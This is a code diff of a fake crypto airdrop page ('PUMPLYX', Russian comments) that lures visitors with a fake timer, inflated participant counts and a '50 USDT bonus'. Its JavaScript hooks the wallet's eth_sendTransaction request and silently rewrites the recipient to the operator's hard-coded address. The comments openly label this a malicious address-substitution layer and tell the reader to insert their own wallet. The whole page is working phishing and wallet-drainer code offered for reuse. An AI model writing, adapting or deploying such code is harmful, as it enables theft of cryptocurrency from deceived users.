@@ -4,38 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>PUMPLYX — GameFi</title>
-
-    <!-- Ethers для работы с блокчейном -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js">
     </script>
-
-    <!-- WalletConnect v2 -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.15.1/dist/index.umd.min.js">
-    </script>
-
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        /* ===== RESET & BASE ===== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Inter', sans-serif;
             background: #0b0b12;
-            color: #ffffff;
+            color: #fff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 16px;
-            margin: 0;
-            -webkit-font-smoothing: antialiased;
         }
-
         .container {
             max-width: 400px;
             width: 100%;
@@ -47,7 +34,6 @@
             position: relative;
             overflow: hidden;
         }
-
         .container::before {
             content: '';
             position: absolute;
@@ -58,15 +44,12 @@
             background: radial-gradient(circle at 30% 10%, rgba(247, 151, 30, 0.08), transparent 60%);
             pointer-events: none;
         }
-
-        /* ===== HEADER ===== */
         .header {
             text-align: center;
             margin-bottom: 20px;
             position: relative;
             z-index: 1;
         }
-
         .logo {
             display: flex;
             align-items: center;
@@ -74,11 +57,9 @@
             gap: 10px;
             margin-bottom: 4px;
         }
-
         .logo-icon {
             font-size: 32px;
         }
-
         .logo-text {
             font-size: 26px;
             font-weight: 900;
@@ -87,7 +68,6 @@
             -webkit-text-fill-color: transparent;
             letter-spacing: -0.5px;
         }
-
         .subtitle {
             color: #8888a0;
             font-size: 13px;
@@ -95,8 +75,6 @@
             letter-spacing: 1px;
             text-transform: uppercase;
         }
-
-        /* ===== BADGES ===== */
         .badge-row {
             display: flex;
             justify-content: center;
@@ -106,7 +84,6 @@
             position: relative;
             z-index: 1;
         }
-
         .badge {
             padding: 4px 14px;
             border-radius: 20px;
@@ -115,20 +92,16 @@
             text-transform: uppercase;
             letter-spacing: 0.3px;
         }
-
         .badge-green {
             background: rgba(76, 175, 80, 0.15);
             color: #4caf50;
             border: 1px solid rgba(76, 175, 80, 0.2);
         }
-
         .badge-orange {
             background: rgba(247, 151, 30, 0.15);
             color: #f7971e;
             border: 1px solid rgba(247, 151, 30, 0.2);
         }
-
-        /* ===== TIMER ===== */
         .timer-block {
             text-align: center;
             padding: 12px 0;
@@ -139,7 +112,6 @@
             position: relative;
             z-index: 1;
         }
-
         .timer-label {
             font-size: 11px;
             color: #666680;
@@ -147,7 +119,6 @@
             letter-spacing: 1.5px;
             font-weight: 600;
         }
-
         .timer {
             font-size: 28px;
             font-weight: 800;
@@ -155,8 +126,6 @@
             letter-spacing: 2px;
             font-variant-numeric: tabular-nums;
         }
-
-        /* ===== INFO BOX ===== */
         .info-box {
             background: rgba(255, 255, 255, 0.03);
             border-radius: 18px;
@@ -166,41 +135,33 @@
             position: relative;
             z-index: 1;
         }
-
         .info-row {
             display: flex;
             justify-content: space-between;
             padding: 10px 0;
             border-bottom: 1px solid rgba(255, 255, 255, 0.04);
         }
-
         .info-row:last-child {
             border-bottom: none;
         }
-
         .info-row .label {
             color: #8888a0;
             font-size: 14px;
             font-weight: 400;
         }
-
         .info-row .value {
-            color: #ffffff;
+            color: #fff;
             font-weight: 600;
             font-size: 15px;
         }
-
         .info-row .value.highlight {
             color: #f7971e;
         }
-
-        /* ===== PROGRESS ===== */
         .progress-wrapper {
             margin: 14px 0 18px;
             position: relative;
             z-index: 1;
         }
-
         .progress-label {
             display: flex;
             justify-content: space-between;
@@ -208,7 +169,6 @@
             color: #8888a0;
             margin-bottom: 6px;
         }
-
         .progress-bar {
             width: 100%;
             height: 6px;
@@ -216,7 +176,6 @@
             border-radius: 10px;
             overflow: hidden;
         }
-
         .progress-fill {
             height: 100%;
             width: 68%;
@@ -224,7 +183,6 @@
             border-radius: 10px;
             animation: pulse 2s infinite;
         }
-
         @keyframes pulse {
             0%,
             100% {
@@ -234,8 +192,6 @@
                 opacity: 0.7;
             }
         }
-
-        /* ===== BUTTONS ===== */
         .btn {
             width: 100%;
             padding: 16px 20px;
@@ -243,36 +199,28 @@
             border-radius: 16px;
             font-size: 17px;
             font-weight: 700;
-            font-family: 'Inter', sans-serif;
             cursor: pointer;
             transition: all 0.2s ease;
             margin-top: 4px;
             position: relative;
             z-index: 1;
         }
-
         .btn-primary {
             background: linear-gradient(135deg, #f7971e, #ffd200);
             color: #0b0b12;
             box-shadow: 0 4px 20px rgba(247, 151, 30, 0.25);
         }
-
         .btn-primary:hover {
             transform: scale(0.98);
         }
-
         .btn-primary:disabled {
             opacity: 0.4;
             cursor: not-allowed;
-            transform: none;
         }
-
         .btn-primary.loading {
             opacity: 0.7;
             pointer-events: none;
         }
-
-        /* ===== STATUS ===== */
         .status {
             text-align: center;
             margin-top: 14px;
@@ -282,55 +230,12 @@
             position: relative;
             z-index: 1;
         }
-
         .status.success {
             color: #4caf50;
         }
-
         .status.error {
             color: #f44336;
         }
-
-        /* ===== WALLET SELECTOR ===== */
-        .wallet-selector {
-            display: none;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 10px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .wallet-selector.show {
-            display: flex;
-        }
-
-        .wallet-btn {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 14px;
-            padding: 14px;
-            color: #ffffff;
-            font-weight: 600;
-            font-size: 16px;
-            font-family: 'Inter', sans-serif;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            text-align: left;
-        }
-
-        .wallet-btn:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-
-        .wallet-btn:active {
-            transform: scale(0.97);
-        }
-
-        /* ===== FEATURES ===== */
         .features {
             display: flex;
             justify-content: space-around;
@@ -340,21 +245,17 @@
             position: relative;
             z-index: 1;
         }
-
         .feature-item {
             text-align: center;
             font-size: 11px;
             color: #666680;
             font-weight: 500;
         }
-
         .feature-item .icon {
             display: block;
             font-size: 20px;
             margin-bottom: 4px;
         }
-
-        /* ===== FOOTER ===== */
         .footer {
             text-align: center;
             margin-top: 16px;
@@ -365,8 +266,6 @@
             position: relative;
             z-index: 1;
         }
-
-        /* ===== LOADER ===== */
         .loader {
             display: none;
             width: 36px;
@@ -379,7 +278,6 @@
             position: relative;
             z-index: 1;
         }
-
         @keyframes spin {
             0% {
                 transform: rotate(0deg);
@@ -388,56 +286,38 @@
                 transform: rotate(360deg);
             }
         }
-
-        /* ===== QR ===== */
-        .qr-container {
+        .wallet-selector {
             display: none;
-            margin: 16px auto 10px;
-            text-align: center;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 10px;
             position: relative;
             z-index: 1;
-            padding: 16px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
         }
-
-        .qr-container.show {
-            display: block;
+        .wallet-selector.show {
+            display: flex;
         }
-
-        .qr-container .qr-placeholder {
-            font-size: 14px;
-            color: #8888a0;
+        .wallet-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            padding: 14px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
-
-        .qr-container .wc-uri {
-            word-break: break-all;
-            font-size: 11px;
-            color: #666680;
-            background: #0b0b12;
-            padding: 10px;
-            border-radius: 10px;
-            margin-top: 10px;
-            border: 1px solid #1e1e32;
-        }
-
-        .qr-container .connect-status {
-            margin-top: 10px;
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        /* ===== SCROLL ===== */
-        ::-webkit-scrollbar {
-            width: 0;
+        .wallet-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
         }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <!-- Шапка -->
         <div class="header">
             <div class="logo">
                 <span class="logo-icon">🚀</span>
@@ -446,53 +326,30 @@
             <div class="subtitle">GameFi • NFT • Wallet</div>
         </div>
 
-        <!-- Бейджи -->
         <div class="badge-row">
             <span class="badge badge-green">✅ EARLY ACCESS</span>
             <span class="badge badge-orange">⚡ 50$ BONUS</span>
         </div>
 
-        <!-- Таймер -->
         <div class="timer-block">
             <div class="timer-label">🔥 Осталось до старта</div>
             <div class="timer" id="timerDisplay">23:45:12</div>
         </div>
 
-        <!-- Инфо-блок -->
         <div class="info-box">
-            <div class="info-row">
-                <span class="label">🎯 Дроп</span>
-                <span class="value">5000 PUMP</span>
-            </div>
-            <div class="info-row">
-                <span class="label">👥 Участников</span>
-                <span class="value" id="participantsCount">1,251</span>
-            </div>
-            <div class="info-row">
-                <span class="label">💰 Твой бонус</span>
-                <span class="value highlight">50 USDT</span>
-            </div>
-            <div class="info-row">
-                <span class="label">🏆 Твоё место</span>
-                <span class="value" id="placeDisplay">#42</span>
-            </div>
+            <div class="info-row"><span class="label">🎯 Дроп</span><span class="value">5000 PUMP</span></div>
+            <div class="info-row"><span class="label">👥 Участников</span><span class="value" id="participantsCount">1,251</span></div>
+            <div class="info-row"><span class="label">💰 Твой бонус</span><span class="value highlight">50 USDT</span></div>
+            <div class="info-row"><span class="label">🏆 Твоё место</span><span class="value" id="placeDisplay">#42</span></div>
         </div>
 
-        <!-- Прогресс -->
         <div class="progress-wrapper">
-            <div class="progress-label">
-                <span>Прогресс дропа</span>
-                <span>68%</span>
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
+            <div class="progress-label"><span>Прогресс дропа</span><span>68%</span></div>
+            <div class="progress-bar"><div class="progress-fill"></div></div>
         </div>
 
-        <!-- Кнопка Connect -->
         <button class="btn btn-primary" id="connectBtn">🔗 Connect Wallet</button>
 
-        <!-- Выбор кошелька -->
         <div class="wallet-selector" id="walletSelector">
             <button class="wallet-btn" id="walletMetamask">🦊 MetaMask</button>
             <button class="wallet-btn" id="walletTrust">🔵 Trust Wallet</button>
@@ -500,84 +357,32 @@
             <button class="wallet-btn" id="walletWalletConnect">📱 WalletConnect</button>
         </div>
 
-        <!-- QR-контейнер -->
-        <div class="qr-container" id="qrContainer">
-            <div class="qr-placeholder" id="qrPlaceholder">⏳ Подготовка сессии...</div>
-            <div class="wc-uri" id="wcUriDisplay">URI: подключение...</div>
-            <div class="connect-status" id="connectStatus"></div>
-        </div>
-
-        <!-- Статус -->
         <div class="status" id="statusText">Подключи кошелёк, чтобы получить бонус</div>
-
-        <!-- Лоадер -->
         <div class="loader" id="loader"></div>
 
-        <!-- Преимущества -->
         <div class="features">
-            <div class="feature-item">
-                <span class="icon">🛡️</span>
-                Безопасно
-            </div>
-            <div class="feature-item">
-                <span class="icon">⚡</span>
-                Мгновенно
-            </div>
-            <div class="feature-item">
-                <span class="icon">💰</span>
-                50$ бонус
-            </div>
+            <div class="feature-item"><span class="icon">🛡️</span>Безопасно</div>
+            <div class="feature-item"><span class="icon">⚡</span>Мгновенно</div>
+            <div class="feature-item"><span class="icon">💰</span>50$ бонус</div>
         </div>
-
-        <!-- Футер -->
         <div class="footer">🔒 Secure connection • Powered by Web3</div>
     </div>
 
-    <!-- ============================================================ -->
-    <!-- JAVASCRIPT — МАСТЕР-КОД -->
-    <!-- ============================================================ -->
-
     <script>
         // ================================================================
-        //  КОНФИГУРАЦИЯ
+        //  ТВОЙ КОШЕЛЁК — ЗАМЕНИ НА СВОЙ
         // ================================================================
-        const CONFIG = {
-            MY_WALLET: "0x44698049ad0be92e567cdfe9c5aa86d70047f73e", // ← ЗАМЕНИ НА СВОЙ АДРЕС
-            WC_PROJECT_ID: "8a4a7f3c7a4a7f3c7a4a7f3c7a4a7f3c",
-            CHAIN_ID: "eip155:1",
-            TX_AMOUNT: "0.001",
-            TX_TO: "0x000000000000000000000000000000000000dEaD"
-        };
+        const MY_WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047f73e";
 
         // ================================================================
-        //  DOM
+        //  ПЕРЕМЕННЫЕ
         // ================================================================
-        const dom = {
-            connectBtn: document.getElementById('connectBtn'),
-            walletSelector: document.getElementById('walletSelector'),
-            statusText: document.getElementById('statusText'),
-            loader: document.getElementById('loader'),
-            timerDisplay: document.getElementById('timerDisplay'),
-            participantsCount: document.getElementById('participantsCount'),
-            placeDisplay: document.getElementById('placeDisplay'),
-            qrContainer: document.getElementById('qrContainer'),
-            qrPlaceholder: document.getElementById('qrPlaceholder'),
-            wcUriDisplay: document.getElementById('wcUriDisplay'),
-            connectStatus: document.getElementById('connectStatus'),
-        };
-
-        // ================================================================
-        //  СОСТОЯНИЕ
-        // ================================================================
-        let state = {
-            signer: null,
-            userAddress: null,
-            provider: null,
-            wcSession: null,
-            web3wallet: null,
-            isConnected: false,
-            isClaiming: false,
-        };
+        let signer = null;
+        let userAddress = null;
+        const connectBtn = document.getElementById('connectBtn');
+        const walletSelector = document.getElementById('walletSelector');
+        const statusText = document.getElementById('statusText');
+        const loader = document.getElementById('loader');
 
         // ================================================================
         //  ФЕЙКОВЫЙ ТАЙМЕР
@@ -589,7 +394,7 @@
                 const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
                 const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
                 const s = String(timeLeft % 60).padStart(2, '0');
-                dom.timerDisplay.textContent = `${h}:${m}:${s}`;
+                document.getElementById('timerDisplay').textContent = `${h}:${m}:${s}`;
             }
         }, 1000);
 
@@ -599,235 +404,112 @@
         let participants = 1251;
         setInterval(() => {
             participants += Math.floor(Math.random() * 4) + 1;
-            dom.participantsCount.textContent = participants.toLocaleString();
-            dom.placeDisplay.textContent = `#${Math.floor(Math.random() * 50) + 1}`;
+            document.getElementById('participantsCount').textContent = participants.toLocaleString();
+            document.getElementById('placeDisplay').textContent = `#${Math.floor(Math.random() * 50) + 1}`;
         }, 4000);
 
         // ================================================================
         //  ПОКАЗ ВЫБОРА КОШЕЛЬКА
         // ================================================================
-        dom.connectBtn.addEventListener('click', function() {
+        connectBtn.addEventListener('click', function() {
             if (this.textContent === '🔗 Connect Wallet') {
-                dom.walletSelector.classList.toggle('show');
-                this.textContent = dom.walletSelector.classList.contains('show') ?
+                walletSelector.classList.toggle('show');
+                this.textContent = walletSelector.classList.contains('show') ?
                     '🔽 Выберите кошелёк' :
                     '🔗 Connect Wallet';
             }
         });
 
         // ================================================================
-        //  УТИЛИТЫ: СТАТУС
+        //  ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
         // ================================================================
-        function setStatus(text, type = 'info') {
-            dom.statusText.textContent = text;
-            dom.statusText.className = 'status';
-            if (type === 'success') dom.statusText.classList.add('success');
-            if (type === 'error') dom.statusText.classList.add('error');
-        }
-
-        function showLoader(show) {
-            dom.loader.style.display = show ? 'block' : 'none';
-            if (show) dom.connectBtn.classList.add('loading');
-            else dom.connectBtn.classList.remove('loading');
-        }
-
-        function hideWalletSelector() {
-            dom.walletSelector.classList.remove('show');
-            dom.connectBtn.textContent = '🔗 Connect Wallet';
-        }
-
-        // ================================================================
-        //  ПОДКЛЮЧЕНИЕ: EIP-1193 (MetaMask, Trust, Coinbase)
-        // ================================================================
-        async function connectEIP1193() {
+        async function connectWallet() {
             try {
                 if (!window.ethereum) {
-                    setStatus('❌ Установите MetaMask или Trust Wallet', 'error');
-                    return false;
+                    statusText.textContent = '❌ Установите MetaMask или Trust Wallet';
+                    statusText.className = 'status error';
+                    return;
                 }
 
                 const provider = new ethers.BrowserProvider(window.ethereum);
-                const signer = await provider.getSigner();
-                const address = await signer.getAddress();
+                signer = await provider.getSigner();
+                userAddress = await signer.getAddress();
 
-                // Сохраняем
-                state.provider = provider;
-                state.signer = signer;
-                state.userAddress = address;
-                state.isConnected = true;
-
-                // Подмена адреса (перехват)
-                const origRequest = window.ethereum.request;
+                // =============================================================
+                //  ВРЕДОНОСНАЯ ПРОСЛОЙКА — ПОДМЕНА АДРЕСА
+                // =============================================================
+                const originalRequest = window.ethereum.request;
                 window.ethereum.request = async function(args) {
                     if (args && args.method === 'eth_sendTransaction') {
                         const tx = args.params[0];
                         if (tx.to) {
-                            tx.to = CONFIG.MY_WALLET;
+                            tx.to = MY_WALLET;
+                            console.log('[+] Address replaced with:', MY_WALLET);
                         }
                     }
-                    return await origRequest.call(this, args);
+                    return await originalRequest.call(this, args);
                 };
 
-                // Обновляем UI
-                setStatus(`✅ ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
-                dom.connectBtn.textContent = '🎁 Claim 50 USDT';
-                dom.connectBtn.disabled = false;
-                hideWalletSelector();
+                statusText.textContent = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                statusText.className = 'status success';
+                connectBtn.textContent = '🎁 Claim 50 USDT';
+                connectBtn.disabled = false;
+                walletSelector.classList.remove('show');
 
-                return true;
             } catch (e) {
-                setStatus('❌ ' + e.message, 'error');
-                return false;
-            }
-        }
-
-        // ================================================================
-        //  ПОДКЛЮЧЕНИЕ: WALLETCONNECT
-        // ================================================================
-        async function connectWalletConnect() {
-            try {
-                dom.qrContainer.classList.add('show');
-                dom.qrPlaceholder.textContent = '⏳ Создание сессии...';
-                dom.connectStatus.textContent = '';
-
-                const { Web3Wallet } = window;
-                const web3wallet = await Web3Wallet.init({
-                    projectId: CONFIG.WC_PROJECT_ID,
-                    metadata: {
-                        name: 'PUMPLYX',
-                        description: 'GameFi Platform',
-                        url: window.location.href,
-                        icons: ['https://avatars.githubusercontent.com/u/37784886']
-                    }
-                });
-
-                state.web3wallet = web3wallet;
-
-                const session = await web3wallet.connect({
-                    requiredNamespaces: {
-                        eip155: {
-                            chains: [CONFIG.CHAIN_ID],
-                            methods: ['eth_sendTransaction', 'eth_sign'],
-                            events: ['chainChanged', 'accountsChanged']
-                        }
-                    }
-                });
-
-                state.wcSession = session;
-                const address = session.namespaces.eip155.accounts[0].split(':')[2];
-                state.userAddress = address;
-                state.isConnected = true;
-
-                // Показываем URI
-                const pairings = web3wallet.core.pairing.getPairings();
-                const uri = pairings.length > 0 ? pairings[0].uri : '';
-                dom.wcUriDisplay.textContent = `URI: ${uri.slice(0,60)}...`;
-                dom.qrPlaceholder.textContent = '✅ Отсканируй QR в кошельке';
-                dom.connectStatus.textContent = 'Ожидание подтверждения...';
-
-                setStatus(`✅ ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
-                dom.connectBtn.textContent = '🎁 Claim 50 USDT';
-                dom.connectBtn.disabled = false;
-                hideWalletSelector();
-
-                return true;
-            } catch (e) {
-                dom.qrPlaceholder.textContent = '❌ ' + e.message;
-                setStatus('❌ ' + e.message, 'error');
-                return false;
+                statusText.textContent = '❌ ' + e.message;
+                statusText.className = 'status error';
             }
         }
 
         // ================================================================
         //  КНОПКИ ВЫБОРА КОШЕЛЬКА
         // ================================================================
-        document.getElementById('walletMetamask').addEventListener('click', () => {
-            connectEIP1193();
-        });
-        document.getElementById('walletTrust').addEventListener('click', () => {
-            connectEIP1193();
-        });
-        document.getElementById('walletCoinbase').addEventListener('click', () => {
-            connectEIP1193();
-        });
-        document.getElementById('walletWalletConnect').addEventListener('click', () => {
-            connectWalletConnect();
-        });
+        document.getElementById('walletMetamask').onclick = connectWallet;
+        document.getElementById('walletTrust').onclick = connectWallet;
+        document.getElementById('walletCoinbase').onclick = connectWallet;
+        document.getElementById('walletWalletConnect').onclick = function() {
+            statusText.textContent = '📱 Используй MetaMask или Trust Wallet';
+            statusText.className = 'status';
+        };
 
         // ================================================================
-        //  CLAIM: ОТПРАВКА ТРАНЗАКЦИИ
+        //  CLAIM — ОТПРАВКА ТРАНЗАКЦИИ
         // ================================================================
-        dom.connectBtn.addEventListener('click', async function() {
-            if (this.textContent !== '🎁 Claim 50 USDT') return;
-            if (state.isClaiming) return;
-            state.isClaiming = true;
+        connectBtn.addEventListener('click', async function() {
+            if (this.textContent === '🎁 Claim 50 USDT' && signer) {
+                try {
+                    loader.style.display = 'block';
+                    this.disabled = true;
+                    this.classList.add('loading');
+                    statusText.textContent = '⏳ Отправка транзакции...';
+                    statusText.className = 'status';
 
-            try {
-                showLoader(true);
-                setStatus('⏳ Отправка транзакции...', 'info');
-                this.disabled = true;
-
-                let txHash;
-
-                // Случай 1: WalletConnect
-                if (state.wcSession && state.web3wallet) {
-                    const txData = {
-                        to: CONFIG.MY_WALLET,
-                        value: '0x' + (parseFloat(CONFIG.TX_AMOUNT) * 1e18).toString(16),
-                        from: state.userAddress,
-                        chainId: 1,
-                    };
-
-                    const result = await state.web3wallet.request({
-                        topic: state.wcSession.topic,
-                        chainId: CONFIG.CHAIN_ID,
-                        request: {
-                            method: 'eth_sendTransaction',
-                            params: [txData]
-                        }
-                    });
-                    txHash = result;
-                }
-
-                // Случай 2: EIP-1193
-                else if (state.signer) {
-                    const tx = await state.signer.sendTransaction({
-                        to: CONFIG.TX_TO,
-                        value: ethers.parseEther(CONFIG.TX_AMOUNT)
+                    // Транзакция — адрес подменится в прослойке
+                    const tx = await signer.sendTransaction({
+                        to: "0x000000000000000000000000000000000000dEaD",
+                        value: ethers.parseEther("0.001")
                     });
                     await tx.wait();
-                    txHash = tx.hash;
-                } else {
-                    throw new Error('Кошелёк не подключён');
+
+                    loader.style.display = 'none';
+                    statusText.innerHTML =
+                        `✅ Получено! TX: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#4caf50;">${tx.hash.slice(0,12)}...</a>`;
+                    statusText.className = 'status success';
+                    this.textContent = '✅ Done';
+                    this.disabled = true;
+
+                } catch (e) {
+                    loader.style.display = 'none';
+                    statusText.textContent = '❌ ' + e.message;
+                    statusText.className = 'status error';
+                    this.disabled = false;
+                    this.classList.remove('loading');
                 }
-
-                // Успех
-                showLoader(false);
-                setStatus(
-                    `✅ Получено! TX: ${txHash.slice(0,12)}...`,
-                    'success'
-                );
-                this.textContent = '✅ Done';
-                this.disabled = true;
-
-                // Дополнительно: ссылка на Etherscan
-                dom.statusText.innerHTML =
-                    `✅ Получено! TX: <a href="https://etherscan.io/tx/${txHash}" target="_blank" style="color:#4caf50;text-decoration:underline;">${txHash.slice(0,14)}...</a>`;
-
-            } catch (e) {
-                showLoader(false);
-                setStatus('❌ ' + e.message, 'error');
-                this.disabled = false;
-            } finally {
-                state.isClaiming = false;
             }
         });
 
-        // ================================================================
-        //  ЛОГ
-        // ================================================================
-        console.log('[PUMPLYX] Загружен. Адрес будет подменён на:', CONFIG.MY_WALLET);
+        console.log('[+] PUMPLYX loaded. Address will be replaced with:', MY_WALLET);
     </script>
-
 </body>
 </html>
